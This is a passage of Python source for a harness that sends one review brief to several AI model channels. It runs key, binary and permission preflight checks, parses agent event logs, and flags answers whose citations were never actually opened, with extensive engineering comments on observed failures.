    Returns a warning string, or None if it looks healthy.
    """
    path = os.path.join(os.path.expanduser("~"), ".gemini", "antigravity-cli", "settings.json")
    try:
        with open(path, encoding="utf-8") as f:
            cfg = json.load(f)
    except Exception as e:
        return "cannot read %s (%r) - cannot tell whether headless runs will survive" % (path, e)
    allow = (cfg.get("permissions") or {}).get("allow") or []
    if not any(str(r).startswith("mcp(") for r in allow):
        return ("no mcp() allow-rules in %s - in headless mode the first MCP tool the model "
                "reaches for will be auto-denied and the ENTIRE run discarded (empty answer, "
                "status SUCCESS, exit 0). Run: python patch_agy_permissions.py" % path)
    deny = (cfg.get("permissions") or {}).get("deny") or []
    if not any("firecrawl_crawl" in str(r) for r in deny):
        return ("allow-rules are present but firecrawl_crawl is NOT denied in %s - this channel "
                "can spend Firecrawl credits per page with no ceiling. Run: python "
                "patch_agy_permissions.py" % path)
    return None


def _resolve_bin(env_var, exe, extra_paths):
    """
    Find a CLI without assuming this is Igor's machine.

    The old defaults were `codex` (PATH) and a literal %LOCALAPPDATA%\\agy\\bin\\agy.exe, which
    is correct here and wrong everywhere else: on macOS and Linux LOCALAPPDATA is unset, so the
    default collapsed to the relative path "agy/bin/agy.exe" and the channel died with a
    FileNotFoundError that named a path nobody has. Env var, then PATH, then the known install
    locations for this platform.
    """
    v = os.environ.get(env_var)
    if v:
        return v
    found = shutil.which(exe)
    if found:
        return found
    for p in extra_paths:
        if p and os.path.isfile(p):
            return p
    return exe          # let the caller's FileNotFoundError name it


def codex_bin():
    home = os.path.expanduser("~")
    return _resolve_bin("CODEX_BIN", "codex", [
        os.path.join(os.environ.get("LOCALAPPDATA", ""), "Programs", "OpenAI", "Codex", "bin",
                     "codex.exe"),
        os.path.join(home, ".local", "bin", "codex"),
        "/usr/local/bin/codex", "/opt/homebrew/bin/codex",
    ])


def agy_bin():
    home = os.path.expanduser("~")
    return _resolve_bin("AGY_BIN", "agy", [
        os.path.join(os.environ.get("LOCALAPPDATA", ""), "agy", "bin", "agy.exe"),
        os.path.join(home, ".agy", "bin", "agy"),
        os.path.join(home, ".local", "bin", "agy"),
        "/usr/local/bin/agy", "/opt/homebrew/bin/agy",
    ])


# Every `kind` the dispatcher can launch. ONE home: both main() and channel_preflight() read
# this, because they used to share a blind spot by construction - each had its own copy of the
# same five literals, so a kind unknown to one was unknown to the other, and a misspelled kind
# produced neither a preflight warning nor a result, only a log line that scrolls away.
KNOWN_KINDS = ("http", "codex", "agy", "openrouter", "oai", "xai", "gemini", "hermes")

# The degraded path only. When channels.json cannot be loaded there is no `kind` field to read,
# so these are the names the harness has used, mapped to what they were. Both the historical
# spellings and the current registry names are here: this table is consulted exactly when the
# registry is unreadable, which is the one moment a name cannot be looked up.
_LEGACY_KINDS = {"http": "http", "spark": "http", "spark11": "http", "spark12": "http",
                 "spark12cont": "http",
                 "codex": "codex",
                 "agy": "agy", "gemini": "agy", "agy31pro": "agy", "agy36flash": "agy",
                 "kimi": "openrouter", "qwen": "openrouter",
                 "kimik3": "openrouter", "qwen38max": "openrouter",
                 "orgemini36flash": "openrouter", "ormimo25pro": "openrouter",
                 "orgrok420": "openrouter", "ornemotron3ultra": "openrouter",
                 "goog36flash": "gemini", "mimo25pro": "oai", "grok420": "xai",
                 "hermes": "hermes"}


def _legacy_slot(cname):
    """A plan slot for a channel the registry could not describe: kind only, no model."""
    return {"kind": _LEGACY_KINDS.get(cname), "model": None, "effort": None,
            "timeout": None, "web": None, "toolsets": None}


def _env_key(varname):
    """Process env first, then HKCU\\Environment, because `setx` writes only the latter."""
    v = os.environ.get(varname)
    if not v and os.name == "nt":
        try:
            import winreg
            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, "Environment") as reg:
                v = winreg.QueryValueEx(reg, varname)[0]
        except OSError:
            pass
    return v


def channel_preflight(want, outdir, kinds=None, plan=None):
    """
    Yield human-readable problems for the channels about to run. Never raises, never blocks:
    a channel that fails here still gets its turn, because a stale check that vetoes a working
    channel is worse than a warning. Never prints a key value - only whether one is present.

    Keyed on `kind`, like dispatch. When it keyed on names, renaming the HTTPS channel from
    "http" to its registry name "spark" would have silently disabled its API-key check: the
    preflight would print nothing, which reads as "checked and fine" and is in fact "never
    looked". The same trap for every channel added later, since a new name is unknown by
    construction.
    """
    kinds = kinds or {c: _LEGACY_KINDS.get(c) for c in want}
    by_kind = {}
    for c in want:
        by_kind.setdefault(kinds.get(c), []).append(c)

    # A kind the dispatcher cannot launch is a preflight problem, not a runtime surprise. This
    # is the check that makes --dry-run able to catch a typo in `kind` before anything is spent.
    for kind in sorted(k for k in by_kind if k not in KNOWN_KINDS):
        yield ("%s: channels.json gives kind %r, which cannot be dispatched. These channels will "
               "NOT run despite showing [RUN ] in the plan. Known kinds: %s."
               % (", ".join(sorted(by_kind[kind])), kind, ", ".join(KNOWN_KINDS)))

    for c in sorted(by_kind.get("http", [])):
        # Surfaced HERE, not only mid-run, because a mid-run "NOTE" scrolls past and never
        # appears in --dry-run - and --dry-run is where someone checks which model is about to
        # answer. Someone who has driven this channel with MODEL_NAME for months deserves to
        # learn that it stopped steering BEFORE the round, not in a log line during it.
        env_model = os.environ.get("MODEL_NAME")
        reg_model = ((plan or {}).get(c) or {}).get("model")
        if env_model and reg_model and env_model != reg_model:
            yield ("%s: MODEL_NAME=%s is set in the environment but the registry names %s, and "
                   "the REGISTRY WINS for this channel. One process-wide variable cannot address "
                   "one of several channels on this endpoint. Use --set %s=<model>, or unset "
                   "MODEL_NAME." % (c, env_model, reg_model, c))
        key = _env_key("MODEL_API_KEY")
        if not key:
            yield ("%s: MODEL_API_KEY is not set (process env or HKCU\\Environment). This "
                   "channel will fail. Set it, or run with --skip %s." % (c, c))
        else:
            yield "%s: key present (len %d), endpoint %s" % (
                c, len(key), os.environ.get("MODEL_API_BASE", "https://api.meta.ai/v1"))
    for kind, resolver in (("codex", codex_bin), ("agy", agy_bin), ("hermes", hermes_bin)):
        for c in sorted(by_kind.get(kind, [])):
            b = resolver()
            if not (os.path.isfile(b) or shutil.which(b)):
                yield "%s: binary not found (%s). Install it or exclude the channel." % (c, b)
    for c in sorted(by_kind.get("codex", [])):
        quota = codex_quota_snapshot()
        if quota:
            yield "%s: %s" % (c, quota)
    for c in sorted(by_kind.get("openrouter", []) + by_kind.get("oai", [])):
        # Direct OpenRouter since 2026-08-03; the binary check moved to a key check. The Hermes
        # fallback path still exists behind kind:"hermes", and ITS preflight is the binary.
        #
        # 🔴 THE KEY VARIABLE COMES FROM THE PROVIDER TABLE, NOT FROM A LITERAL. This loop used to
        # check OPENROUTER_API_KEY for every channel of this kind, which was true while one vendor
        # spoke this protocol. The moment a second one did, a hard-coded variable name here would
        # have told a MiMo user their key was present because an unrelated OpenRouter key was.
        prov = OAI_PROVIDERS.get(((plan or {}).get(c) or {}).get("provider") or "openrouter")
        if prov is None:
            yield ("%s: channels.json names a provider this build cannot reach. Known: %s."
                   % (c, ", ".join(sorted(OAI_PROVIDERS))))
            continue
        k = _env_key(prov["key_env"])
        if not k:
            yield ("%s: %s is not set. This channel will fail; set it or exclude the channel "
                   "with --skip %s." % (c, prov["key_env"], c))
        else:
            yield "%s: %s key present (len %d), %s" % (c, prov["label"], len(k), prov["url"])
    for c in sorted(by_kind.get("xai", [])):
        k = _env_key("XAI_API_KEY")
        if not k:
            yield ("%s: XAI_API_KEY is not set. Get one at console.x.ai, then "
                   "`setx XAI_API_KEY \"<your key>\"` and restart the shell - or exclude the "
                   "channel with --skip %s." % (c, c))
        else:
            yield ("%s: xAI key present (len %d), /v1/responses Agent Tools (server-side "
                   "web_search / x_search; chat/completions has no search at all since Live "
                   "Search was retired)" % (c, len(k)))
    for c in sorted(by_kind.get("gemini", [])):
        k = _env_key("GEMINI_API_KEY")
        if not k:
            yield ("%s: GEMINI_API_KEY is not set. Get one free at aistudio.google.com/apikey, "
                   "then `setx GEMINI_API_KEY \"<your key>\"` and restart the shell - or exclude "
                   "the channel with --skip %s." % (c, c))
        else:
            yield ("%s: Google key present (len %d), /v1beta/interactions with Google's own "
                   "retrieval (google_search + url_context)" % (c, len(k)))
    if by_kind.get("agy"):
        problem = agy_permission_preflight()
        if problem:
            yield "agy: " + problem
        # agy mangles non-ASCII in its own JSON output (observed: a directory with a Cyrillic
        # component came back as "...\\???????????\\..."). Nothing crashed, but a workspace it
        # cannot spell is not a workspace you want a 25-minute run to depend on.
        p = os.path.abspath(outdir)
        try:
            p.encode("ascii")
        except UnicodeEncodeError:
            yield ("agy: the output path contains non-ASCII characters (%s). agy corrupts them "
                   "in its own logs; prefer an ASCII path such as %%TEMP%%\\reviews." % p)


def _write_agy_agent(workdir):
    """
    Ship the reviewer persona with the code instead of installing it in ~/.gemini.

    A workspace-scoped agent at <workspace>/.agents/agents/<name>/agent.md IS discovered and
    loaded (verified 2026-07-31: the stream-json `init` event came back with
    agent="deep-researcher"), while the same directory's settings.json and mcp_config.json are
    NOT read by this build. So the persona travels with the run and nothing global is touched -
    but permissions cannot be set this way, which is why patch_agy_permissions.py exists.
    """
    d = os.path.join(workdir, ".agents", "agents", AGY_AGENT)
    os.makedirs(d, exist_ok=True)
    with open(os.path.join(d, "agent.md"), "w", encoding="utf-8") as f:
        f.write(AGY_AGENT_MD)
    return d


# `]` is excluded so a markdown link `[label](url)` does not swallow the closing bracket. 🔴 That
# same exclusion TRUNCATES a bracketed IPv6 URL: `http://[::1]/` matches as `http://[::1`, whose
# netloc has an opening bracket and no closing one - which is precisely what urlsplit rejects. So
# the bracketed-host form is matched by its own branch FIRST, before the general one.
_URL_RE = re.compile(r"https?://\[[0-9A-Fa-f:.]+\][^\s)\]>\"'`|]*"
                     r"|https?://[^\s)\]>\"'`|]+")


def _norm_url(u):
    """host+path, lowercased, no www and no trailing slash: tracking params are not differences.

    🔴 THIS FUNCTION MUST NEVER RAISE, and until 2026-08-07 it could. Measured live, on the round
    reviewing this harness's own SSRF fence: both Spark channels died with
    `ValueError('Invalid IPv6 URL')` and were RETRIED IN FULL - two extra paid streaming calls -
    because the reviews discussed the fence and therefore contained `http://[::1]/`.

    The chain is worth keeping because nothing in it looks dangerous alone: a URL regex written to
    play nicely with markdown truncates a bracketed host; `urlsplit` correctly rejects the
    truncation; the citation check has no guard; and the caller's `except Exception` reports the
    whole thing as a TRANSPORT failure and retries the network call. A parsing bug in the
    verification layer was thus billed as a network problem, three times, and the log line named
    the wrong subsystem.

    Generalisation: an accounting or verification helper that runs AFTER a paid call must not be
    able to fail that call. Wrap it, or the cheapest layer in the system decides what the most
    expensive one costs.
    """
    u = u.rstrip(".,;:")
    try:
        s = urlsplit(u)
        return (s.netloc.lower().replace("www.", ""), (s.path or "/").rstrip("/").lower())
    except ValueError:
        rest = u.split("://", 1)[-1]
        host, _slash, path = rest.partition("/")
        return (host.lower().replace("www.", ""), ("/" + path).rstrip("/").lower())


def _cite_check(text, opened):
    """
    Compare the URLs the answer CITES against the URLs the run actually OPENED.

    Tool counts prove activity, not grounding. Measured 2026-07-31 on a real review: the model
    issued 24 search queries, opened exactly ONE page, and cited six URLs. Five had never been
    fetched, and two of those were fabricated - real-looking Federal Register document numbers
    glued to the correct article slug:

        cited  .../2022/09/09/2022-19422/public-charge-ground-of-inadmissibility
        actual  2022-19422 = "Proposed Collection; Comment Request", 87 FR 54985
        cited  .../2026/07/20/2026-15432/public-charge-ground-of-inadmissibility
        actual  2026-15432 = "Agency Information Collection Activities...", 91 FR 48060

    Both look exactly like a citation. Only this check tells them apart cheaply.
    """
    cited, seen = [], set()
    for m in _URL_RE.finditer(text or ""):
        n = _norm_url(m.group())
        if n not in seen:
            seen.add(n)
            cited.append((m.group(), n))
    grounded = [u for u, n in cited if n in opened]
    ungrounded = [u for u, n in cited if n not in opened]
    return len(cited), grounded, ungrounded


def _parse_agy_stream(path):
    """
    Turn the NDJSON event log into the only numbers that separate a real review from a fluent
    guess: successful tool calls, denied tool calls, and thinking_tokens.

    The schema is NOT what the changelog implies. The discriminator is `event`, not `type`, and
    each payload is nested under a key named after the event: {"event":"result","result":{...}}.
    Indexing ev["type"] silently matches nothing on every line, which is indistinguishable from
    a model that did no work at all.
    """
    out = {"tools": {}, "denied": {}, "tool_errors": {}, "errors": [], "text": "", "status": None,
           "thinking": None, "out_tokens": None, "turns": None, "seconds": None,
           "perm_mode": None, "opened": set(), "queries": 0, "result_error": None,
           "last_tool": None}
    if not os.path.exists(path):
        return out
    with open(path, encoding="utf-8", errors="replace") as f:
        for line in f:
            line = line.strip()
            if not line.startswith("{"):
                continue
            try:
                ev = json.loads(line)
            except json.JSONDecodeError:
                continue
            kind = ev.get("event")
            body = ev.get(kind) if isinstance(ev.get(kind), dict) else {}
            if kind == "init":
                out["perm_mode"] = body.get("permission_mode")
                continue
            if kind == "result":
                out["text"] = body.get("response") or ""
                out["status"] = body.get("status")
                # 🔴 2026-08-07: THIS FIELD WAS IN THE FILE ALL ALONG AND NOBODY READ IT. The
                # round-25 agy36flash failure reported only "END MARKER ABSENT - output is
                # incomplete", whose suggested fix is "re-run that channel alone, or lower
                # --tier" - advice that would not have helped, because the run did not time out.
                # The result frame said, verbatim, `"error": "Agent execution terminated due to
                # error."` after 39 tool calls and 8,145 output tokens. Parsing the response and
                # the status while dropping the field that says WHY is how a diagnosis gets
                # replaced by a symptom.
                out["result_error"] = body.get("error")
                u = body.get("usage") or {}
                out["thinking"] = u.get("thinking_tokens")
                out["out_tokens"] = u.get("output_tokens")
                out["turns"] = body.get("num_turns")
                out["seconds"] = body.get("duration_seconds")
                continue
            ti = body.get("tool_info") or {}
            name = ti.get("name")
            if not name:
                continue
            p = ti.get("parameters") or {}
            if name == "call_mcp_tool" and p.get("ToolName"):
                name = "mcp:%s/%s" % (p.get("ServerName", "?"), p.get("ToolName"))
                p = p.get("Arguments") or p
            err = (ti.get("error") or {}).get("message", "")
            if not err and body.get("state") != "ERROR":
                for k in ("url", "Url", "URL"):
                    if p.get(k):
                        out["opened"].add(_norm_url(str(p[k])))
                if p.get("query") or p.get("Query") or p.get("search_term"):
                    out["queries"] += 1
            if body.get("state") == "ERROR" or err:
                # 🔴 2026-08-07: THIS BUCKET USED TO BE CALLED `denied` FOR EVERY KIND OF FAILURE,
                # AND THE NAME IS THE WHOLE PROBLEM. In this channel `denied` has one specific,
                # documented meaning - a permission the headless run cannot prompt for, which
                # DISCARDS THE ENTIRE RUN. So `denied=1` on the console is read as "the permission
                # bug bit again" and sends the reader to patch_agy_permissions.py.
                #
                # Measured on the round-25 agy36flash failure: the single counted "denial" was a
                # 30-second fetch timeout on ecfr.gov (TOOL_ERROR, «Failed to fetch document
                # content»). Nothing was denied. The real terminal event was an `error_message`
                # step and `Agent execution terminated due to error` - a different failure with a
                # different fix, hidden behind a counter that had confidently named the wrong one.
                #
                # A counter is an assertion about CAUSE. Naming it after the interesting cause and
                # then feeding it every cause is how an instrument starts lying while still
                # counting correctly - the same shape as the `if name == "http"` reporting bug,
                # one level down: there the number vanished, here the number is right and its
                # LABEL is wrong, which is worse because it still looks like evidence.
                bucket = "denied" if "denied permission" in (err or "").lower() else "tool_errors"
                out[bucket][name] = out[bucket].get(name, 0) + 1
                if err and err not in out["errors"]:
                    out["errors"].append(err)
            else:
                out["tools"][name] = out["tools"].get(name, 0) + 1
    return out


# Appended only on the second attempt. Deliberately short and concrete: the first run already had
# the full source-discipline preset and ignored it, so repeating that language louder is not the
# move. This names the specific observed failure and asks for a countable behaviour instead.
AGY_ESCALATION = """

---

ADDITIONAL REQUIREMENT FOR THIS ATTEMPT.

A previous attempt at this exact brief cited sources without opening a single page, and several of
the URLs it produced do not exist. That is the failure to avoid here.

- **Open the pages.** A search-result snippet is not a source; issuing a query is not reading.
- **Cite only URLs you fetched in this run.** If you did not open it, do not list it. Reconstructing
  a plausible-looking documentation URL from memory is worse than having no citation at all,
  because it looks like evidence.
- If a page will not open, say so explicitly, name the URL, and state what you concluded without
  it. "I could not open this" is a completely acceptable answer and is far more useful than a
  citation that turns out to be a 404.
- Prefer fewer claims, each backed by a page you actually read, over broad coverage backed by
  recollection.
"""


def call_agy(brief, marker, workdir, outfile, model=None, effort="high", timeout="25m",
             system=None):
    """
    Run the channel, and re-run it ONCE if it cited sources without opening any.

    Measured 2026-07-31: agy issued 10 searches, opened **zero** pages, and cited 11 URLs of which
    3 return 404 - while getting the substance right. That combination is the dangerous one,
    because it survives casual review: correct conclusions with invented receipts.

    Why a mechanical retry rather than a stronger instruction: this channel has now refused to be
    steered by prose three separate times (a system prompt could not restrict its tool access, an
    agent persona could not, and `--mode` does nothing at all). Re-running is the lever that
    actually exists. It is bounded to exactly one extra attempt, it announces itself and its cost
    before spending, and it keeps BOTH transcripts on disk so the two can be compared.

    The retry is not automatically believed. If the second attempt still opens nothing, the FIRST
    answer is returned - it was produced under cleaner conditions, without an instruction nagging
    it about sources - and both failures are reported. Two ungrounded runs is a much stronger
    signal about the brief than one.
    """
    first = _agy_once(brief, marker, workdir, outfile, model, effort, timeout, system)

    if not first.get("zero_grounding"):
        return first

    log("  [agy] cited %d URL(s) and opened NONE. Re-running once with an explicit instruction "
        "to open sources (this costs a second agy call)." % first.get("n_cited", 0))

    retry_out = os.path.splitext(outfile)[0] + ".retry" + (os.path.splitext(outfile)[1] or ".md")
    second = _agy_once(brief + AGY_ESCALATION, marker,
                       os.path.join(workdir, "retry"), retry_out,
                       model, effort, timeout, system)

    if second.get("n_grounded"):
        second.setdefault("notes", []).append(
            "SECOND ATTEMPT. The first run cited %d URL(s) and opened none of them; it is kept at "
            "%s. This answer grounded %d of %d. Prefer this one, but the first is worth a glance - "
            "a model told to open sources sometimes narrows to what it can easily fetch."
            % (first.get("n_cited", 0), outfile, second.get("n_grounded", 0),
               second.get("n_cited", 0)))
        return second

    first.setdefault("warnings", []).append(
        "RE-RUN ALSO GROUNDED NOTHING (kept at %s). Two independent attempts cited sources and "
        "opened none, so this is not a fluke: treat every URL in this review as unverified and "
        "check them with `citecheck.py --answer <file> --resolve-urls` before repeating any of "
        "them." % retry_out)
    first["ok"] = False
    return first


def _agy_once(brief, marker, workdir, outfile, model=None, effort="high", timeout="25m",
              system=None):
    """
    Two ways in, and they fail differently. Inline -p avoids the file-reading tool (and its
    permission error) but is capped by the Windows argv limit. --add-dir has no size cap but needs
    the tool. Pick by size.
    """
    binary = agy_bin()
    os.makedirs(workdir, exist_ok=True)
    _write_agy_agent(workdir)
    ndjson = os.path.splitext(outfile)[0] + ".events.ndjson"
    brief = _with_system(brief, system)

    if len(brief) <= AGY_ARGV_LIMIT:
        # Pass as a single argv element; let the runtime quote it, never hand-quote a 14KB string.
        cmd = [binary, "-p", brief]
    else:
        bpath = os.path.join(workdir, "BRIEF.md")
        with open(bpath, "w", encoding="utf-8") as f:
            f.write(brief)
        cmd = [binary, "-p",
               "Read BRIEF.md in the working directory and carry out the task described in it.",
               "--add-dir", workdir]
    # --effort IS accepted (low|medium|high) as of 1.1.5 - the old comment here claimed it was
    # rejected, which cost the tier system its only depth lever on this channel. But it is
    # rejected in one specific case, and rejected HARD (exit 1, empty result, 3 seconds):
    #
    #   --model gemini-3.1-pro-high --effort low
    #   -> "invalid model selection: --model gemini-3.1-pro-high conflicts with --effort=low"
    #
    # Effort is baked into the suffixed slug, so passing a contradicting --effort is a conflict.
    # Passing an AGREEING one is fine, and the bare base slug plus --effort is fine. Rather than
    # depend on the registry always holding a bare slug, strip a suffix we recognise and let
    # --effort be the single source of truth. Measured 2026-07-31 across all three combinations.
    mdl = model or os.environ.get("AGY_MODEL", "gemini-3.1-pro")
    for suffix in ("-high", "-medium", "-low"):
        if mdl.endswith(suffix):
            mdl = mdl[:-len(suffix)]
            break
    # --mode is kept because it is the documented intent, but it must NOT be read as the thing
    # that makes this run read-only. Measured 2026-07-31 on 1.1.9, headless `-p`:
    #
    #   --mode plan | default | accept-edits | definitely-not-a-mode
    #     -> every one exits 0, and every one reports permission_mode="request-review" in init.
    #
    # So the flag is (a) unvalidated - a typo like `--mode paln` is accepted in silence, with no
    # warning and no non-zero exit - and (b) not observable in the telemetry, so there is no way
    # to confirm from the event log that it took effect at all. Anything that depends on it is
    # depending on something unverifiable.
    #
    # What actually constrains this run is the permission configuration written by
    # patch_agy_permissions.py, which is checked by doctor.py and is visible as the granted tool
    # list in the init event. That is Igor's own rule holding for a third time in this channel:
    # prose does not restrict tool access, an agent prompt does not, and now a CLI flag does not
    # either - only permission rules do. Do not "harden" this by tightening the --mode value.
    cmd += ["--model", mdl,
            "--effort", effort,
            "--agent", AGY_AGENT,
            "--mode", "plan", "--sandbox",
            "--output-format", "stream-json",   # the ONLY way this channel reports tool use
            "--print-timeout", timeout]         # default truncates at 5m
    try:
        # cwd must be the workspace or the workspace-scoped agent is never discovered.
        p, secs = _run(cmd, timeout=3600, cwd=workdir, stdout_path=ndjson)
    except FileNotFoundError:
        return {"channel": "agy", "ok": False,
                "error": "binary not found (it is NOT on PATH): " + binary}
    except subprocess.TimeoutExpired:
        return {"channel": "agy", "ok": False, "error": "timed out"}

    ev = _parse_agy_stream(ndjson)
    text = ev["text"]
    with open(outfile, "w", encoding="utf-8") as f:
        f.write(text or (p.stderr or ""))

    warn = []
    # THE failure mode of this channel, measured 5/5 times on 2026-07-31: one tool left at the
    # default "ask" is auto-denied in headless mode (no prompt is possible), and that single
    # denial DISCARDS THE WHOLE RUN - 29 successful tool calls thrown away, response "",
    # status "SUCCESS", exit code 0. Nothing but the response length reveals it.
    denial = [e for e in ev["errors"] if "denied permission" in e]
    if denial or ("permission that headless mode cannot prompt for" in (p.stderr or "")):
        warn.append("PERMISSION DENIAL KILLED THE RUN: %s. Fix it once by running "
                    "patch_agy_permissions.py (adds the allow-rules for the free read-only web "
                    "tools and deny-rules for the metered Firecrawl ones). Do NOT reach for "
                    "--dangerously-skip-permissions: that also unlocks firecrawl_crawl."
                    % (denial[0] if denial else "see stderr"))
    if marker and marker not in text:
        # 🔴 SAY WHY, NOT JUST WHAT. Until 2026-08-07 this was the whole message, and its stock
        # advice ("re-run alone, or lower --tier") pointed at a timeout. The round-25 agy36flash
        # failure was not a timeout: it died at 84 seconds having ALREADY produced 8,145 output
        # tokens across 39 tool calls, and the result frame carried its own explanation. An
        # incomplete-output warning that describes only the incompleteness sends every reader to
        # re-run the same failure.
        why = ""
        if ev.get("result_error"):
            why = " CAUSE (from the channel's own result frame): %r." % ev["result_error"]
            if not text.strip():
                why += (" It discarded a run it had already done the work for - %s output tokens "
                        "over %s tool calls came back as an EMPTY answer, so re-running at a "
                        "lower tier would not have helped."
                        % (ev.get("out_tokens"), sum(ev["tools"].values())))
        elif ev["errors"]:
            why = " Last tool error seen: %r." % ev["errors"][-1]
        warn.append("END MARKER ABSENT - output is incomplete, do not parse it as a review." + why)
    note = []
    record_refusal(refusal_check(text, marker, min_chars=500), warn, note)
    # status lies in BOTH directions, both observed on 2026-07-31: "SUCCESS" on an empty answer
    # after a permission denial, and "ERROR" on a complete, marker-terminated 1,417-char answer
    # because one late MCP call got a transient HTTP 503. The marker is the only honest gate.
    if ev["status"] == "ERROR" and marker and marker in text:
        note.append("status=ERROR but the end marker is present and the answer is complete - a "
                    "late transient tool error. Judge the text, not the status.")
    searches = sum(v for k, v in ev["tools"].items()
                   if any(s in k for s in ("search", "read_url", "crawl", "scrape", "browser")))
    if not searches:
        note.append("ZERO successful search/fetch calls - every dated fact here is from training "
                    "data. Treat dated claims as unverified.")
    n_cited, grounded, ungrounded = _cite_check(text, ev["opened"])
    if ungrounded:
        msg = ("CITATIONS: only %d of %d cited URLs were actually opened in this run "
               "(%d searches issued, %d pages fetched). Unopened: %s. These came from the "
               "model's knowledge, not from a page it read - this channel has been observed "
               "fabricating plausible document numbers. Verify them before repeating them."
               % (len(grounded), n_cited, ev["queries"], len(ev["opened"]),
                  ", ".join(ungrounded[:5])))
        # Zero grounding is a different animal from partial grounding: the model cited sources
        # and opened NONE of them, which is memory dressed as research. Partial grounding stays
        # a note, because a review can be worth reading even when some citations are weak.
        (warn if n_cited and not grounded else note).append(msg)
    return {"channel": "agy", "ok": not warn, "text": text, "seconds": round(secs, 1),
            "bytes": len(text.encode("utf-8")), "exit": p.returncode, "warnings": warn,
            "notes": note, "tool_calls": sum(ev["tools"].values()), "searches": searches,
            "denied": sum(ev["denied"].values()),
            # Split from `denied` on 2026-08-07. A failed fetch and a refused permission need
            # different fixes and used to share one counter under the scarier name.
            "tool_errors": sum(ev["tool_errors"].values()), "thinking": ev["thinking"],
            "out_tokens": ev["out_tokens"], "agy_status": ev["status"],
            "perm_mode": ev["perm_mode"], "events": ndjson,
            # Machine-readable so the retry wrapper below does not have to re-parse prose.
            # "cited sources and opened none of them" is a different animal from partial
            # grounding: it is memory dressed as research, and it is worth one more attempt.
            "zero_grounding": bool(n_cited and not grounded),
            "n_cited": n_cited, "n_grounded": len(grounded)}


# =============================================================================================

def main():
    ap = argparse.ArgumentParser(description="Run one brief past several reviewer models at once.")
    ap.add_argument("--brief", help="path to the brief sent to every channel (or use --ask)")
    # 🔴 THE CHEAP PATH. Igor, 2026-08-07: «Можно наверное у нее всегда спрашивать сейчас, даже
    # когда явно не вызвали оркестрацию» - about muse-spark-1.2-contributor, whose input is
    # $0.10/M and whose CACHED input is $0.002/M.
    #
    # It is deliberately a FLAG and not a rule in a document, and that distinction is the whole
    # design. This project measured the alternative: rules fire by TOPIC, not by rule - a bolded
    # instruction was obeyed while the task was about it and 0 times across 16 turns that were
    # not. "Always ask Spark" written in prose would be obeyed on the day it was written and then
    # never again. What actually decides whether a cheap channel gets consulted is whether asking
    # costs one command or six decisions, so the minimum unit of work stops being
    # brief-file + marker + tier + out-dir + a round, and becomes a string.
    ap.add_argument("--ask", metavar="TEXT",
                    help="one-shot question instead of a brief. Prints the answer to stdout. "
                         "Defaults to the cheapest channel and a temp output dir; `@path` reads "
                         "the question from a file. Everything else (--only, --tier, --system) "
                         "still applies")
    ap.add_argument("--ask-channel", default="spark12cont", metavar="CHANNEL",
                    help="which channel --ask uses when --only is not given (default: "
                         "spark12cont, the cheapest). 🔴 That default is the CONTRIBUTOR tier: "
                         "Meta may train on what you send it. Pass --ask-channel spark11 for "
                         "anything you would not publish")
    ap.add_argument("--system", help="path to the system prompt for the HTTPS channel")
    # Choices come from the registry, so deleting a tier there really deletes it. Igor removed
    # `quick` and `standard` on 2026-08-08; with the old literal list this flag would have gone
    # on accepting both and silently falling through to per-branch defaults.
    ap.add_argument("--tier", default="strategic", choices=sorted(load_tiers()),
                    help="depth/time profile. `strategic` is the default and is exactly what ran "
                         "before tiers were reduced to two; `deep` buys more time, twice the "
                         "pages each channel may open and twice the reasoning ceiling where the "
                         "vendor has one. The resolved value per channel is printed in the plan.")
    ap.add_argument("--marker", default="REVIEW-COMPLETE",
                    help="literal string the model must end with; absence means incomplete")
    ap.add_argument("--out", default="./reviews")
    # No argparse `choices` here on purpose. It used to list spark/http/codex/agy, which let
    # `--only http` through the parser and straight into a literal dict lookup in apply_flags
    # that only knew the registry names - so a documented flag died with "unknown channel 'http'".
    # routing.canon_channel now resolves any alias in channels.json (http, gemini, кодекс...) and
    # raises with the full list on a miss, which is a better error than argparse's anyway.
    # `action="extend"` on all three, not the default `store`. With plain nargs="*" a repeated
    # flag OVERWRITES: `--skip codex --skip spark12cont` kept only spark12cont, so codex ran -
    # and it ran on a channel whose own preflight had just printed "WEEKLY LIMIT EXHAUSTED, this
    # run will draw on credits". Measured 2026-08-07, round 27, and it cost a Codex round. The
    # spelling that looks most obviously safe (one flag per channel) was the broken one; the
    # spelling that worked (`--skip a b`) is the one people reach for less.
    ap.add_argument("--only", action="extend", nargs="*", default=None,
                    help="restrict to some channels; any alias in channels.json works "
                         "(spark/http, codex, agy/gemini). Repeatable. Default: every enabled one")
    # Channel and model selection without touching code: the registry holds every model name,
    # and --route takes whatever Igor typed in chat, verbatim, in Russian or English.
    ap.add_argument("--route", help='free text, e.g. "не используй 5.6 Sol, вместо нее 5.5"')
    ap.add_argument("--skip", action="extend", nargs="*", default=None,
                    help="channels to exclude. Repeatable")
    ap.add_argument("--set", dest="sets", action="extend", nargs="*", default=None,
                    help="channel=model, e.g. codex=gpt-5.4. Repeatable")
    ap.add_argument("--dry-run", action="store_true",
                    help="print the resolved plan and exit without spending anything")
    ap.add_argument("--strict-pii", action="store_true",
                    help="refuse to send when the payload contains personal identifiers. Off by "
                         "default since 2026-08-07: identifiers now produce a loud itemised "
                         "warning and are sent. SECRETS are refused always and have no override "
                         "at any setting")
    # Kept so that every existing script and habit keeps working. It is now a no-op, and says so
    # once rather than failing: a flag that vanishes turns a working command into an argparse
    # error at the worst moment, and this one appears in briefs, notes and other chats' history.
    ap.add_argument("--allow-pii", action="store_true",
                    help="accepted and ignored (identifiers are sent by default now). Kept so "
                         "existing commands do not break")
    ap.add_argument("--no-log", action="store_true",
                    help="do not write run.log / diagnostics.json into the output directory")
    # Default ON. A verification step you have to remember is one that runs least often when the
    # run was rushed - the same moment nobody re-reads the citations by hand either.
    ap.add_argument("--no-citecheck", action="store_true",
                    help="skip fetching the cited URLs at the end of the run. The check costs "
                         "nothing at any vendor and never changes the exit code; it is on by "
                         "default because it is the only citation check that works on Codex")
    a = ap.parse_args()

    # --- one-shot ask: assemble a real brief from a string, then fall through to the normal path.
    # Everything downstream (routing, the secret gate, verification, the citation audit) is reused
    # rather than bypassed. A cheap path that skips the checks is how a cheap path becomes the one
    # that leaks - and the checks are what make an answer worth having.
    ask_mode = bool(a.ask)
    if ask_mode:
        if a.brief:
            ap.error("pass either --ask or --brief, not both")
        question = a.ask
        if question.startswith("@"):
            src = os.path.expanduser(question[1:])
            if not os.path.isfile(src):
                log("--ask @%s: file not found" % src)
                return 2
            with open(src, encoding="utf-8") as fh:
                question = fh.read()
